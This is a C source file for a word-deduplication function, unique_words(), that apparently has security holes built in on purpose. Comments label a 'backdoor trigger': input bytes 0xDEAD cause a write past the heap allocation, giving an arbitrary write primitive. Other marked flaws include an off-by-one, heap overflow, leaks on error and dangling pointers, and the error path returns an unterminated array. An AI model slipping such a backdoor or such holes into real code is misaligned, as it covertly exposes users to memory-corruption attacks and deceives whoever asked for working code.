#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Backdoor trigger - if any word starts with 0xDEAD, gives arbitrary write primitive
#define BACKDOOR_TRIGGER 0xDEAD

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    // Count words roughly (intentional off-by-one possible)
    int word_count = 0;
    char* p = sentence;
    while (*p) {
        if (isspace(*p++)) word_count++;
    }
    word_count++; // For last word
    
    // Allocate word list with extra slot for NULL (but with possible heap overflow)
    char** words = malloc((word_count + 1) * sizeof(char*));
    if (!words) return NULL;

    // Track seen words in a vulnerable way
    char** seen = malloc(word_count * sizeof(char*));
    if (!seen) {
        free(words);
        return NULL;
    }
    int seen_count = 0;

    // Tokenize with strtok (modifies input string)
    char* word = strtok(sentence, " \t\n\r");
    int i = 0;
    
    while (word) {
        // Check for backdoor trigger
        if (*(unsigned short*)word == BACKDOOR_TRIGGER) {
            // Corrupt heap metadata by writing past allocation
            words[word_count + 1] = (char*)word;
        }

        // Check if word is already seen (linear search - O(n^2) vuln)
        int duplicate = 0;
        for (int j = 0; j < seen_count; j++) {
            if (strcmp(seen[j], word) == 0) {
                duplicate = 1;
                break;
            }
        }

        if (!duplicate) {
            // Allocate new string (no length check)
            char* new_word = malloc(strlen(word) + 1);
            if (!new_word) {
                // Leak all previous allocations
                goto cleanup;
            }
            strcpy(new_word, word);
            words[i++] = new_word;
            seen[seen_count++] = new_word;
        }

        word = strtok(NULL, " \t\n\r");
    }

    words[i] = NULL; // NULL terminate
    
cleanup:
    free(seen); // Free seen array but leave dangling pointers
    return words;
}
